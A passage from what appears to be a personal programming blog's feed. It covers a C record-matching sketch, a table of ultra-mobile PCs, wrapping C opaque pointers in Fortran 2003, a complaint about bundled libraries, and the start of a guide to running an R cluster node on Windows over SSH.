bool match<span style="color:#000000">(</span>const struct entry <span style="color:#000000">*</span> a<span style="color:#000000">,</span> const struct entry <span style="color:#000000">*</span> b<span style="color:#000000">) {</span>
	<span style="color:#000000; font-weight:bold">return</span> a<span style="color:#000000">-&gt;</span><span style="color:#010181">param3</span> <span style="color:#000000">==</span> b<span style="color:#000000">-&gt;</span><span style="color:#010181">param3</span> <span style="color:#000000">&amp;&amp;</span> a<span style="color:#000000">-&gt;</span><span style="color:#010181">param4</span> <span style="color:#000000">==</span> b<span style="color:#000000">-&gt;</span><span style="color:#010181">param4</span><span style="color:#000000">;</span>
<span style="color:#000000">}</span>

double score<span style="color:#000000">(</span>const struct entry <span style="color:#000000">*</span> a<span style="color:#000000">,</span> const struct entry <span style="color:#000000">*</span> b<span style="color:#000000">) {</span>
	<span style="color:#000000; font-weight:bold">return</span> fabs<span style="color:#000000">(</span>a<span style="color:#000000">-&gt;</span><span style="color:#010181">param1</span> <span style="color:#000000">-</span> b<span style="color:#000000">-&gt;</span><span style="color:#010181">param1</span><span style="color:#000000">) +</span> fabs<span style="color:#000000">(</span>a<span style="color:#000000">-&gt;</span><span style="color:#010181">param2</span> <span style="color:#000000">-</span> b<span style="color:#000000">-&gt;</span><span style="color:#010181">param2</span><span style="color:#000000">);</span>
<span style="color:#000000">}</span>

fstat<span style="color:#000000">(</span>fda<span style="color:#000000">, &amp;</span>st<span style="color:#000000">);</span>
size_t sizea <span style="color:#000000">=</span> st<span style="color:#000000">.</span>st_size <span style="color:#000000">/</span> sizeof<span style="color:#000000">(</span>struct entry<span style="color:#000000">);</span>
struct entry <span style="color:#000000">*</span> paramsa <span style="color:#000000">=</span> mmap<span style="color:#000000">(</span>NULL<span style="color:#000000">,</span> st<span style="color:#000000">.</span>st_size<span style="color:#000000">,</span> PROT_READ<span style="color:#000000">,</span> MAP_PRIVATE <span style="color:#000000">|</span> MAP_POPULATE<span style="color:#000000">,</span> fda<span style="color:#000000">,</span> <span style="color:#b07e00">0</span><span style="color:#000000">);</span>
<span style="color:#010181">/* same for paramsb */</span>

<span style="color:#000000; font-weight:bold">for</span> <span style="color:#000000">(</span>size_t a <span style="color:#000000">=</span> <span style="color:#b07e00">0</span><span style="color:#000000">;</span> a <span style="color:#000000">&lt;</span> sizea<span style="color:#000000">; ++</span>k<span style="color:#000000">) {</span>
		double minscore <span style="color:#000000">=</span> INFINITY<span style="color:#000000">;</span>
		<span style="color:#000000; font-weight:bold">for</span> <span style="color:#000000">(</span>size_t b <span style="color:#000000">=</span> <span style="color:#b07e00">0</span><span style="color:#000000">;</span> b <span style="color:#000000">&lt;</span> sizeb<span style="color:#000000">; ++</span>n<span style="color:#000000">) {</span>
				<span style="color:#000000; font-weight:bold">if</span> <span style="color:#000000">(!</span>match<span style="color:#000000">(&amp;</span>paramsa<span style="color:#000000">[</span>a<span style="color:#000000">], &amp;</span>paramsb<span style="color:#000000">[</span>b<span style="color:#000000">]))</span> <span style="color:#000000; font-weight:bold">continue</span><span style="color:#000000">;</span>
				double scr <span style="color:#000000">=</span> score<span style="color:#000000">(&amp;</span>paramsa<span style="color:#000000">[</span>a<span style="color:#000000">], &amp;</span>paramsb<span style="color:#000000">[</span>b<span style="color:#000000">]);</span>
				<span style="color:#000000; font-weight:bold">if</span> <span style="color:#000000">(</span>scr <span style="color:#000000">&lt;</span> minscore<span style="color:#000000">) {</span>
						minscore <span style="color:#000000">=</span> scr<span style="color:#000000">;</span>
				<span style="color:#000000">}</span>
		<span style="color:#000000">}</span>
		<span style="color:#000000; font-weight:bold">printf</span><span style="color:#000000">(</span><span style="color:#bf0303">&quot;</span><span style="color:#0057ae">%g</span><span style="color:#bf0303"></span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">&quot;</span><span style="color:#000000">,</span> minscore<span style="color:#000000">);</span>
<span style="color:#000000">}</span>
</pre>



<p>It took 2 minutes 9 seconds to obtain all the information I needed. Now that I knew the distribution of minimal const function values, it was easy to choose the threshold - and, with a different C program, print out matching <code>id</code>s to import back in the database.</p>
				</div>
			</content>
		</entry>
<entry>
			<title>Modern Ultra-mobile PCs</title>
			<link href="https://aitap.github.io/2018/10/23/umpc.html" />
			<id>https://aitap.github.io/2018/10/23/umpc.html</id> <!-- unique enough -->
			<updated>2018-10-23T00:00:00Z</updated>
			<content type="xhtml">
				<div xmlns="http://www.w3.org/1999/xhtml"><p>The market of sub-11" laptops, also known as <a href="https://en.wikipedia.org/wiki/UMPC"><span class="caps">UMPC</span>s</a>, seemed almost non-existent until last year, when quite a few new models emerged, most of them from China. Here I will try to summarize the available spectrum of modern models:</p>


<table><tr><th>Name</th><th>Price</th><th>Processor</th><th><span class="caps">RAM</span></th><th>Size</th><th>OS</th><th>Notes</th></tr><tr><td>Cosmo Communicator</td><td><a href="https://www.indiegogo.com/projects/cosmo-communicator">$569</a></td><td><span class="caps">ARM</span>: 4x Cortex <span class="caps">A73 </span>+ 4x Cortex <span class="caps">A53 </span>+ Mali <span class="caps">G72 MP3</span> 800MHz</td><td>6GB</td><td>171.4×79.3×16 mm</td><td>Android, Sailfish, <span class="caps">GNU</span>/Linux</td><td>Currently in the crowdfunding stage, but &#8804; 455%  funded. Is Mediatek <span class="caps">P70 </span>supported by mainline kernel?</td></tr><tr><td><a href="https://www.planetcom.co.uk/">Gemini <span class="caps">PDA</span></a></td><td><a href="https://store.planetcom.co.uk/collections/gemini-pda">£499-599</a></td><td><span class="caps">ARM</span>: 2x Cortex <span class="caps">A72 </span>+ 8x Cortex <span class="caps">A53 </span>+ Mali 875MHz</td><td>4GB</td><td>171.4×79.3×15.1 mm</td><td>Android, optional dual-boot with <span class="caps">GNU</span>/Linux</td><td>Has optional 4G module and everything a smartphone is supposed to have. <span class="caps">GNU</span>/Linux support is questionable, no information whether mainline kernels will run. Keyboard was supposedly developed by people from Psion.</td></tr><tr><td><span class="caps">GPD</span> MicroPC</td><td><a href="https://old.reddit.com/r/GPDPocket/comments/a5h3pa/gpd_micropc_announced/">$299</a> (to be announced?)</td><td>Intel Celeron <span class="caps">N4100</span></td><td>4GB</td><td>6 inch display</td><td>Windows?</td><td>The crowdfunding campaign is supposed to start on February 15, 2019. Not much is known yet.</td></tr><tr><td><a href="https://gpd.hk/gpdpocket2"><span class="caps">GPD</span> Pocket 2</a></td><td><a href="https://aliexpress.com/w/wholesale-GPD-Pocket-2.html">$540-628</a></td><td>Intel Core m3-7y30</td><td>4-8GB</td><td>181×113×14 mm</td><td>Windows 10; partial support in mainline Linux</td><td>The TrackPoint was replaced with something they call Optical Finger Navigation.</td></tr><tr><td><a href="https://gpd.hk/gpdpocket"><span class="caps">GPD</span> Pocket</a></td><td><a href="http://www.dx.com/p/gpd-pocket-7-aluminum-shell-mini-laptop-umpc-windows-10-system-cpu-x7-z8750-8gb-ram-128gb-rom-silver-488406">$499</a></td><td>Intel Atom x7-Z8750</td><td>4-8GB</td><td>180×106×18.5 mm</td><td>Windows 10; partial support in mainline Linux</td><td>Wi-Fi antenna installed in the wrong place, causing much lower signal levels. No microSD card slot.</td></tr><tr><td><a href="http://gpd.hk/gdpwin2"><span class="caps">GPD</span> Win 2</a></td><td><a href="https://www.aliexpress.com/store/product/New-GPD-WIN-2-6-Inch-Handheld-Gaming-Laptop-Intel-Core-m3-7Y30-Windows-10-System/1281164_32884328950.html">$715.05</a></td><td>Intel Core m3-7Y30</td><td>8GB</td><td>162×99×25 mm</td><td>Windows 10</td><td>More like a Windows game console. Until recently, there also was 5.5" GPD Win 1, which was much cheaper. It doesn't seem to be available now.</td></tr><tr><td><a href="https://www.geekbuying.com/item/One-Netbook-One-Mix-2-Yoga-Pocket-Laptop-Intel-Core-M3-Touch-ID-Silver-405731.html">One-Notebook OneMix 2 Yoga</a></td><td><a href="https://www.geekbuying.com/item/One-Netbook-One-Mix-2-Yoga-Pocket-Laptop-Intel-Core-M3-Touch-ID-Silver-405731.html">$629.99</a></td><td>Intel Core m3-7Y30</td><td>8GB</td><td>182×110×17 mm</td><td>Windows 10</td><td>Even less information seems to be available (where is the official site?). Has everything OneMix 1 has and a fingerprint scanner.</td></tr><tr><td><a href="http://en.one-netbook.com/OneMix/">One-Notebook OneMix Yoga</a></td><td><a href="https://item.jd.com/27865658387.html">￥2958.00</a></td><td>Intel Atom x5-Z8350 (?)</td><td>8GB</td><td>182×110×17 mm</td><td>Windows 10</td><td>Seems to be a clone of Pocket. The thing it has instead of a TrackPoint looks like <span class="caps">OFN </span>from Pocket 2. Has a stylus included. Official shop seems to be Chinese-only, not sure about delivery options. Screen rotates all the way, 360°. Backlit keyboard.</td></tr><tr><td><a href="https://panasonic.jp/cns/pc/products/rz6c/">Panasonic Let's Note</a></td><td><abbr title="オープン価格商品です。価格は販売店にお問い合わせください。">It is an open price item. Please contact the dealer for the price.</abbr> (≥$2000 on eBay)</td><td>Intel Core i5-7Y54 or m3-7Y30</td><td>8GB</td><td>250×180×19.5 mm</td><td>Windows 10, maybe Windows 7</td><td>This series of laptops has existed for quite a while, and continued being sold even when <span class="caps">UMPC </span>sales dropped outside Japan. Unlike other models here, it's 10" instead of around 7", but built to last, passing drop and vibration tests. Otherwise, not much information is available, except in Japanese.</td></tr><tr><td><a href="https://pyra-handheld.com/boards/pages/pyra/">Pyra handheld</a></td><td><a href="https://www.dragonbox.de/en/45-pyra">€500-626</a> (pre-order)</td><td><span class="caps">ARM</span>: TI <span class="caps">OMAP</span> 5 (2x Cortex-A15 + 2x Cortex-M4 + PowerVR <span class="caps">SGX544</span>-MP2 + Vivante <span class="caps">GC320</span>)</td><td>2-4GB</td><td>139×87×32 mm</td><td><span class="caps">GNU</span>/Linux</td><td>More like a game console. Optional 3G/4G/UMTS+GPS. Replaceable battery, <span class="caps">CPU.</span> Keyboard for thumb-typing. Open source hardware.</td></tr><tr><td><a href="https://www.ogadget.com/x1/falcon">Topjoy Falcon</a></td><td><a href="https://www.indiegogo.com/projects/falcon-best-ultraportable-2-in-1-laptop">$429</a> (pledge on Indiegogo); pen or sleeve not included; expected retail price is $699</td><td>Intel Pentium Silver <span class="caps">N5000</span></td><td>8GB</td><td>200×130×20 mm</td><td>Windows 10; partial support in mainline Linux</td><td>8" screen; "OFN" in place of a TrackPoint; capacitive stylus is supported.</td></tr></table>

<p>I like <span class="caps">UMPC</span>s for entirely personal and irrational reasons. For me, it's an ultimate geek toy. Nevertheless, my <span class="caps">GPD</span> Pocket 1 does increase my productivity at times when I'm away from a power outlet and don't have room to place a proper laptop (e.g.: on the road or on a useless phillosophy seminar I'm required to attend).</p>

<p>With more than 10 items in the list, it seems evident that <span class="caps">UMPC </span>market lives again. I don't intend to update this page.</p>
				</div>
			</content>
		</entry>
<entry>
			<title>Wrapping C opaque pointers in Fortran 2003 in type-strict way</title>
			<link href="https://aitap.github.io/2018/09/23/f03opaque.html" />
			<id>https://aitap.github.io/2018/09/23/f03opaque.html</id> <!-- unique enough -->
			<updated>2018-09-23T00:00:00Z</updated>
			<content type="xhtml">
				<div xmlns="http://www.w3.org/1999/xhtml"><p><a href="https://en.wikipedia.org/wiki/Opaque_pointer">Opaque pointers</a> are a programming technique used to hide implememtation details. In C, you can declare that a <code>struct</code> exists but don't tell the compiler anything else about it:</p>



<pre>
<span style="color:#0057ae">struct</span> target<span style="color:#000000">;</span>
<span style="color:#0057ae">struct</span> target <span style="color:#000000">*</span> <span style="color:#010181">new_target</span><span style="color:#000000">(</span><span style="color:#0057ae">void</span><span style="color:#000000">);</span>
<span style="color:#0057ae">void</span> <span style="color:#010181">shoot</span><span style="color:#000000">(</span><span style="color:#0057ae">struct</span> target <span style="color:#000000">*);</span>
</pre>



<p>At the cost of one more pointer access per function call you now have totally abstracted the inner details of the structure. You are now free to change them at will. The code that doesn't know the definition of the structure can only have pointers to objects of this incomplete type and distinguish between pointers of different types, but cannot peek inside:</p>



<pre>
<span style="color:#0057ae">struct</span> foot<span style="color:#000000">;</span>
<span style="color:#0057ae">struct</span> foot <span style="color:#000000">*</span> <span style="color:#010181">new_foot</span><span style="color:#000000">(</span><span style="color:#0057ae">void</span><span style="color:#000000">);</span>

<span style="color:#0057ae">struct</span> target <span style="color:#000000">*</span> tgt <span style="color:#000000">=</span> <span style="color:#010181">new_foot</span><span style="color:#000000">();</span>
<span style="color:#838183; font-style:italic">// warning: initialization from incompatible pointer type [-Wincompatible-pointer-types]</span>
<span style="color:#000000">*</span>tgt<span style="color:#000000">;</span>
<span style="color:#838183; font-style:italic">// error: dereferencing pointer to incomplete type ‘struct target’</span>
</pre>



<p>Of course, reading the memory is not actually forbidden, as is type casting:</p>



<pre>
<span style="color:#0057ae">struct</span> foot <span style="color:#000000">*</span> f <span style="color:#000000">=</span> <span style="color:#010181">new_foot</span><span style="color:#000000">();</span>
<span style="color:#0057ae">char</span> buf<span style="color:#000000">[</span><span style="color:#b07e00">256</span><span style="color:#000000">];</span>
<span style="color:#010181">memcpy</span><span style="color:#000000">(</span>buf<span style="color:#000000">,</span> foot<span style="color:#000000">,</span> <span style="color:#b07e00">42</span><span style="color:#000000">);</span> <span style="color:#838183; font-style:italic">// the user still has to guess the size of the structure, though</span>
<span style="color:#838183; font-style:italic">// look ma, no warnings!</span>
<span style="color:#010181">shoot</span><span style="color:#000000">((</span><span style="color:#0057ae">struct</span> target<span style="color:#000000">*)</span>foot<span style="color:#000000">);</span>
</pre>



<p>If you find yourself questioning the use of such opaque pointers, have a look at <code>FILE*</code>-related functions in the standard C library. Depending on where you got it from, the actual <code>FILE</code> may store just a file descriptor and a buffer, or a <a href="http://pubs.opengroup.org/onlinepubs/9699919799/functions/open_memstream.html">dynamically allocated buffer that is pretending it's a file</a>, or <a href="https://www.gnu.org/software/libc/manual/html_node/Streams-and-Cookies.html">something completely different</a>. And even if you only limit yourself to actual filesystems, by using <code>FILE*</code> you stop caring whether the underlying file descriptor is a <a href="https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-createfilea"><span class="caps">HANDLE</span></a> or an <a href="http://pubs.opengroup.org/onlinepubs/9699919799/functions/open.html">int</a> and how exactly should you do I/O on it.</p>

<p>So there is no surprise that <a href="https://nlopt.readthedocs.io/en/latest/">NLopt</a> uses opaque pointers to hide the way it allocates and stores data:</p>



<pre>
<span style="color:#0057ae">struct</span> nlopt_opt_s<span style="color:#000000">;</span>
<span style="color:#000000; font-weight:bold">typedef</span> <span style="color:#0057ae">struct</span> nlopt_opt_s <span style="color:#000000">*</span>nlopt_opt<span style="color:#000000">;</span>
</pre>



<p>What if we want to call the library from Fortran? The <a href="https://nlopt.readthedocs.io/en/latest/NLopt_Fortran_Reference/">documentation</a> states:</p>

<blockquote><p>The nlopt_opt type corresponds to <code>integer*8</code>. (Technically, we could use any type that is big enough to hold a pointer on all platforms; <code>integer*8</code> is big enough for pointers on both 32-bit and 64-bit machines.)</p></blockquote>

<p>NLopt supports very old programming language standards: if you omit a few algorithms from the library, you can build it with an <span class="caps">ANSI</span> C compiler and then call it from a <span class="caps">FORTRAN</span> 77 program. This is actually good (don't you hate it when a new app requires you to upgrade your libraries, your operating system, your computer, your spouse, and your cat?), but let's try to employ some techniques for writing cleaner and safer code brought to us by Fortran 90 (derived types) and Fortran 2003 (C interoperability).</p>

<p>The way that's usually recommended on the internet to wrap opaque pointers is just to declare them on the Fortran side as <code>type(c_ptr)</code>, a type with all its fields private that corresponds to <code>void *</code>. Which is not wrong: according to the C standard, any pointer may be safely cast to <code>void *</code> and back and still compare equal to the original.</p>

<p>A concrete example:</p>



<pre>
nlopt_opt <span style="color:#010181">nlopt_create</span><span style="color:#000000">(</span>nlopt_algorithm algorithm<span style="color:#000000">,</span> <span style="color:#0057ae">unsigned</span> n<span style="color:#000000">);</span>
</pre>



<p>transforms to:</p>



<pre>
<span style="color:#000000; font-weight:bold">function</span> <span style="color:#010181">nlopt_create</span><span style="color:#000000">(</span>algo<span style="color:#000000">,</span> n<span style="color:#000000">)</span> <span style="color:#010181">result</span><span style="color:#000000">(</span>opt<span style="color:#000000">)</span> <span style="color:#010181">bind</span><span style="color:#000000">(</span>c<span style="color:#000000">)</span>
 <span style="color:#000000; font-weight:bold">use</span><span style="color:#000000">,</span> <span style="color:#000000; font-weight:bold">intrinsic</span> <span style="color:#000000">::</span> iso_c_binding
 <span style="color:#000000; font-weight:bold">type</span><span style="color:#000000">(</span>c_ptr<span style="color:#000000">) ::</span> opt
 <span style="color:#838183; font-style:italic">! assume that NLOPT_* algorithm enums were defined as enum, bind(c)</span>
 <span style="color:#000000; font-weight:bold">integer</span><span style="color:#000000">(</span><span style="color:#010181">kind</span><span style="color:#000000">(</span>NLOPT_NUM_ALGORITHMS<span style="color:#000000">)),</span> value <span style="color:#000000">::</span> algo
 <span style="color:#838183; font-style:italic">! also, there are no unsigned integers in Fortran, but the size matches</span>
 <span style="color:#000000; font-weight:bold">integer</span><span style="color:#000000">(</span>kind<span style="color:#000000">=</span>c_int<span style="color:#000000">),</span> value <span style="color:#000000">::</span> n
<span style="color:#000000; font-weight:bold">end function</span>
</pre>



<p>And this is, mostly, good enough: Fortran is usually written by <a href="https://en.wikipedia.org/wiki/Real_Programmers_Don%27t_Use_Pascal">real programmers</a> who don't confuse one <code>void*</code> with another <code>type(c_ptr)</code> and if you actually have more than one kind of opaque C pointer in your program, why are you still writing Fortran? But let's try to make <code>nlopt_opt</code> a distinct type in Fortran anyway.</p>

<p>I couldn't express "this is a pointer to a user-defined type that's never actually defined" in Fortran in a way that would still be interoperable with C. <del>We will have to create a fully-defined derived type and make it behave exactly as an opaque pointer would. Before we do that, let's prove a lemma:</del></p>



<pre>
<span style="color:#000000; font-weight:bold">typedef</span> <span style="color:#0057ae">struct</span> nlopt_opt_s <span style="color:#000000">*</span>nlopt_opt<span style="color:#000000">;</span>

<span style="color:#838183; font-style:italic">// is the same thing as</span>

<span style="color:#000000; font-weight:bold">typedef</span> <span style="color:#0057ae">struct</span> <span style="color:#000000">{</span>
	<span style="color:#0057ae">void</span> <span style="color:#000000">*</span> nlopt_opt_s<span style="color:#000000">;</span>
<span style="color:#000000">}</span> nlopt_opt<span style="color:#000000">;</span>

<span style="color:#838183; font-style:italic">// for bit pattern purposes</span>
</pre>



<p><del><br />
<a href="http://c0x.coding-guidelines.com/6.7.2.1.html#1423">C standard, §6.7.2.1</a> says:<br />
</del></p>

<blockquote><p><del>A pointer to a structure object, suitably converted, points to its initial member (or if that member is a bit-field, then to the unit in which it resides), and vice versa.<br />
There may be unnamed padding within a structure object, but not at its beginning.</del></p></blockquote>

<p><del><br />
So the beginning of our struct is guaranteed to be the same as beginning of the pointer we want to represent. What about the end? <a href="http://c0x.coding-guidelines.com/6.7.2.1.html#1428">C standard, §6.7.2.1</a> is less optimistic:<br />
</del></p>

<blockquote><p><del>There may be unnamed padding at the end of a structure or union</del></p></blockquote>

<p><del><br />
However, on the architectures I have access to (Linux and Windows on 32-bit and 64-bit Intel; Linux on 32-bit <span class="caps">ARM</span>) no padding is placed after the pointer because <code>void*</code> is <a href="http://www.catb.org/esr/structure-packing/#_alignment_requirements">self-aligned</a> - alignment requirement of the pointer type is the same as the pointer size.<br />
</del></p>

<p><del><br />
So a struct containing a single pointer has, indeed, the same size and bit pattern as just a pointer. (Unless you are using a weird architecture that does things differently. In that case, sorry.) The difference is that we can express such a struct as an interoperable derived Fortran type:<br />
</del></p>



<pre>
<span style="color:#000000; font-weight:bold">type</span><span style="color:#000000">,</span> <span style="color:#010181">bind</span><span style="color:#000000">(</span>c<span style="color:#000000">) ::</span> nlopt_opt
 private
 <span style="color:#000000; font-weight:bold">type</span><span style="color:#000000">(</span>c_ptr<span style="color:#000000">) ::</span> ptr
<span style="color:#000000; font-weight:bold">end type</span>
</pre>



<p><del><br />
Passing the structure by value is equivalent to passing the original pointer, um, by value. By marking the pointer private we ensure the original intent of opaque pointers: the implementation informaion is hidden from the library user. With that done, we can write a type-strict definition for all methods of the NLopt object:<br />
</del></p>



<pre>
<span style="color:#838183; font-style:italic">!NLOPT_EXTERN(nlopt_opt) nlopt_create(nlopt_algorithm algorithm, unsigned n);</span>
<span style="color:#000000; font-weight:bold">function</span> <span style="color:#010181">nlopt_create</span><span style="color:#000000">(</span>algo<span style="color:#000000">,</span> n<span style="color:#000000">)</span> <span style="color:#010181">bind</span><span style="color:#000000">(</span>c<span style="color:#000000">)</span> <span style="color:#010181">result</span><span style="color:#000000">(</span>ret<span style="color:#000000">)</span>
 import nlopt_opt<span style="color:#000000">,</span> c_int
 <span style="color:#000000; font-weight:bold">type</span><span style="color:#000000">(</span>nlopt_opt<span style="color:#000000">) ::</span> ret
 <span style="color:#000000; font-weight:bold">integer</span><span style="color:#000000">(</span><span style="color:#010181">kind</span><span style="color:#000000">(</span>NLOPT_NUM_ALGORITHMS<span style="color:#000000">)),</span> value <span style="color:#000000">::</span> algo
 <span style="color:#000000; font-weight:bold">integer</span><span style="color:#000000">(</span>c_int<span style="color:#000000">),</span> value <span style="color:#000000">::</span> n
<span style="color:#000000; font-weight:bold">end function</span>

<span style="color:#838183; font-style:italic">!NLOPT_EXTERN(void) nlopt_destroy(nlopt_opt opt);</span>
<span style="color:#000000; font-weight:bold">subroutine</span> <span style="color:#010181">nlopt_destroy</span><span style="color:#000000">(</span>opt<span style="color:#000000">)</span> <span style="color:#010181">bind</span><span style="color:#000000">(</span>c<span style="color:#000000">)</span>
 import nlopt_opt
 <span style="color:#000000; font-weight:bold">type</span><span style="color:#000000">(</span>nlopt_opt<span style="color:#000000">),</span> value <span style="color:#000000">::</span> opt
<span style="color:#000000; font-weight:bold">end subroutine</span>
</pre>



<p><ins><br />
Unfortunately, the code described above, despite working on my machine, is <a href="https://stackoverflow.com/a/52577289">incorrect</a>. While on some machines a <code>struct whatever *</code> gets passed in the same way a <code>struct { void * ptr; }</code> would, it is in no way guaranteed that rules for returning primitive and aggregate types would remain same, despite them having the same size and alignment.<br />
</ins></p>

<p><ins><br />
Therefore, the correct solution is either to continue using <code>type(c_ptr)</code> with no distinction between kinds of <code>void*</code>, or to create a proper devived type and write a bunch of wrapper functions, hoping that they would get inlined by other code. You can also declare a finalizer or even rewrite all C procedure calls into object methods:<br />
</ins></p>



<pre>
<span style="color:#000000; font-weight:bold">type</span> <span style="color:#000000">::</span> nlopt_opt
 private
 <span style="color:#000000; font-weight:bold">type</span><span style="color:#000000">(</span>c_ptr<span style="color:#000000">) ::</span> ptr <span style="color:#000000">=</span> C_NULL_PTR
<span style="color:#000000; font-weight:bold">contains</span>
 procedure <span style="color:#000000">::</span> set_xtol_rel <span style="color:#838183; font-style:italic">! add more methods here</span>
 final <span style="color:#000000">::</span> destroy
<span style="color:#000000; font-weight:bold">end type</span> nlopt_opt

<span style="color:#000000; font-weight:bold">subroutine</span> <span style="color:#010181">destroy</span><span style="color:#000000">(</span>this<span style="color:#000000">)</span>
 <span style="color:#010181">class</span><span style="color:#000000">(</span>nlopt_opt<span style="color:#000000">) ::</span> this
 <span style="color:#000000; font-weight:bold">interface</span>
  <span style="color:#000000; font-weight:bold">subroutine</span> <span style="color:#010181">nlopt_destroy</span><span style="color:#000000">(</span>opt<span style="color:#000000">)</span> <span style="color:#010181">bind</span><span style="color:#000000">(</span>c<span style="color:#000000">)</span>
   import nlopt_opt
   <span style="color:#000000; font-weight:bold">type</span><span style="color:#000000">(</span>nlopt_opt<span style="color:#000000">),</span> value <span style="color:#000000">::</span> opt
  <span style="color:#000000; font-weight:bold">end subroutine</span>
 <span style="color:#000000; font-weight:bold">end interface</span>

 <span style="color:#000000; font-weight:bold">call</span> <span style="color:#010181">nlopt_destroy</span><span style="color:#000000">(</span>this<span style="color:#000000">%</span>ptr<span style="color:#000000">)</span>
<span style="color:#000000; font-weight:bold">end subroutine</span> destroy
</pre>



<p>Now package it all in a Fortran 90 module and you are done.</p>
				</div>
			</content>
		</entry>
<entry>
			<title>Dear developers,</title>
			<link href="https://aitap.github.io/2018/09/12/dear.html" />
			<id>https://aitap.github.io/2018/09/12/dear.html</id> <!-- unique enough -->
			<updated>2018-09-12T00:00:00Z</updated>
			<content type="xhtml">
				<div xmlns="http://www.w3.org/1999/xhtml"><p>When you write a program, or a library (especially a library!), please don't bundle third-party code you depend on together with your own.</p>

<p>Okay, that may have been a little harsh. Allow me to explain.</p>

<p>1. How frequently do you update the bundled library? What happens if there is a fresh new arbitrary code execution vulnerability in the copy of <code>libwhatever</code> you've included? You are not a <code>libwhatever</code> maintainer, you don't have time for the security stuff. While the system copy of <code>libwhatever</code> will get the emergency patch and stay safe, your code (and anything upwards the dependency tree, if you wrote a library) will stay vulnerable.</p>

<p>Yes, I am looking at you, <a href="http://fte.triptohell.info/"><span class="caps">FTE</span></a>. Bundling Speex, <span class="caps">JPEG, PNG,</span> Vorbis, zlib, <a href="https://sourceforge.net/p/fteqw/code/HEAD/tree/trunk/engine/libs/">most of them last updated around 2011</a> (at the time of the writing). Not cool, even if your build system uses the system libraries on non-Windows platforms.</p>

<p>2. Actually, do you even update the bundled library at all? There's no incentive to do that: a library that's bundled with your source code stays the same no matter what, frozen in amber. Outside, the world may gain support for new formats and protocols at the cost of slight <span class="caps">API </span>changes, but you have escaped the pain of eventually making a few fixes to your program have it magically support all those new features. Your copy of the library is always bug-to-bug compatible to the one you wrote your code against, so you start ignoring the <span class="caps">API </span>contract and relying on the implementation details.</p>

<p>3. Actually, can you even call it the same <code>libwhatever</code> as it once was? If you bundled the library, you may as well start changing it. After all, it's not private <span class="caps">API </span>if you have all the sources, right?</p>

<p>Yes, I'm looking at you, <del><span class="caps">IUP</span></del> <a href="http://webserver2.tecgraf.puc-rio.br/im">IM</a>. I can understand the default paths correponding to where you are used to keeping your dependencies at <span class="caps">TECGRAF.</span> It's okay as long as I can point the variables somewhere else. I can understand the <a href="http://webserver2.tecgraf.puc-rio.br/tecmake/">custom <code>Makefile</code>-based build system</a>. You needed to support a lot of very different and not very standards-compliant platforms and compilers; you had version 3.0 in 2002, when CMake was about version 1.3 and it's not like CMake is ideal in the first place.</p>

<p>But when you do this:</p>



<pre>
$ make im

Tecmake: starting [ im:Linux49_64 ]

Tecmake: compiling tiff_binfile.c ...
gcc -c  -Wall -O2 -m64 -fPIC -I. -I../include -Iliblzf -DUSE_EXIF -DTEC_UNAME=Linux49_64 \
	-DTEC_SYSNAME=Linux -DLinux=4.9 -DTEC_LITTLEENDIAN -DTEC_64 -DFUNCPROTO=15 -DNDEBUG \
	-o ../obj/Linux49_64/tiff_binfile.o tiff_binfile.c
tiff_binfile.c:79:8: error: dereferencing pointer to incomplete type ‘TIFF {aka struct tiff}’
     tif-&gt;tif_fd = fd;
        ^~
</pre>



<p>While the library explicitly says this:</p>



<pre>
<span style="color:#838183; font-style:italic">/*</span>
<span style="color:#838183; font-style:italic"> * TIFF is defined as an incomplete type to hide the</span>
<span style="color:#838183; font-style:italic"> * library's internal data structures from clients.</span>
<span style="color:#838183; font-style:italic"> */</span>
<span style="color:#000000; font-weight:bold">typedef</span> <span style="color:#0057ae">struct</span> tiff TIFF<span style="color:#000000">;</span>
</pre>



<p>I don't know what to do. Your code is so tightly coupled to the library you're shipping with that it's impossible to compile it against system <code>libtiff</code> unchanged. I might as well declare it a part of <code>IM</code> now. Which doesn't mean anything good for <code>IM</code> because, again, <a href="https://sourceforge.net/p/imtoolkit/im/HEAD/tree/trunk/im/src/libtiff/">they only have libtiff 4.0.6</a> (updated more than two years ago) and there have been <a href="http://metadata.ftp-master.debian.org/changelogs//main/t/tiff/tiff_4.0.8-2+deb9u2_changelog">tens of security fixes</a> since then.</p>

<p>This combination of arcane build system, strange defaults and library bundling and patching is the reason we can't have nice things (like <code>IUP</code> in Debian, for example). Please don't do that.</p>

<p>Best regards,</p>
				</div>
			</content>
		</entry>
<entry>
			<title>Starting an R cluster node on Windows</title>
			<link href="https://aitap.github.io/2018/08/22/winclust.html" />
			<id>https://aitap.github.io/2018/08/22/winclust.html</id> <!-- unique enough -->
			<updated>2018-08-22T00:00:00Z</updated>
			<content type="xhtml">
				<div xmlns="http://www.w3.org/1999/xhtml"><p>Core R package <a href="http://stat.ethz.ch/R-manual/R-devel/library/parallel/doc/parallel.pdf">parallel</a> makes it possible to run trivially parallel tasks on clusters of mostly independent workers. There are many articles on the Internet about connecting to an R cluster from a Windows machine. Today we're going to use a Windows machine as a cluster node, instead.</p>

<p>Function <code>makeCluster</code> requires some kind of way of running command lines on the cluster node (unless you pass <code>manual=TRUE</code> and follow the instructions). <a href="https://en.wikipedia.org/wiki/Secure_Shell"><span class="caps">SSH</span></a> is a good way to do that securely. I'm going to use <a href="https://cygwin.com/">Cygwin</a> because it doesn't require administrative privileges to install or run. Make sure you install the <code>openssh</code> package.</p>

<p>Here's the custom config file <code>/home/WinUserName/sshd/sshd_config</code> we are going to start <code>sshd</code> with:</p>



<pre>
# Ports below 1024 may require administrative privileges
Port 2222
# We want non-interactive authentication
PasswordAuthentication no
PubkeyAuthentication yes
# Host key is the identity of the ssh server, like TLS certificate of a website
HostKey /home/WinUserName/sshd/hostkey
</pre>



<p>Use <code>ssh-keygen -f /home/WinUserName/sshd/hostkey</code> to generate the identity key of our <span class="caps">SSH </span>server.</p>

<p>Since we're going noninteractive, let's create our own client key we're going to authenticate with and make it known to both sides of the connection. On the client, generate a key using <code>ssh-keygen</code> and add the following to <code>~/.ssh/config</code>:</p>



<pre>
Host win-cluster-node
	User WinUserName
	# assuming that your key is in ~/.ssh/win-cluster-key
	IdentityFile ~/.ssh/win-cluster-key
	Port 2222
	Hostname FILL_WINDOWS_SERVER_ADDRESS_HERE
</pre>




